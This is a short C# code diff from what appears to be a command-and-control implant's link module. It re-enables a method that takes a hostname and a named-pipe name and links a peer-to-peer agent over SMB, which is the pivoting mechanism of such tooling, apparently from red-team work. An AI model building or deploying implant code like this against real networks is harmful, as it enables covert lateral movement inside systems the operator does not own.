@@ -69,12 +69,12 @@ class LinkModule : IAgentModule
 
     private void LinkSmbAgent(byte[] data)
     {
-        //var args = Encoding.UTF8.GetString(data).Split(' ');
-        //var hostname = args[0];
-        //var pipename = args[1];
+        var args = Encoding.UTF8.GetString(data).Split(' ');
+        var hostname = args[0];
+        var pipename = args[1];
 
-        //var module = new SmbCommModule(hostname, pipename);
-        //Agent.AddP2PAgent(hostname, module);
+        var module = new SmbCommModule(hostname, pipename);
+        Agent.AddP2PAgent(hostname, module);
     }
 
     private void IncomingLink(byte[] data)
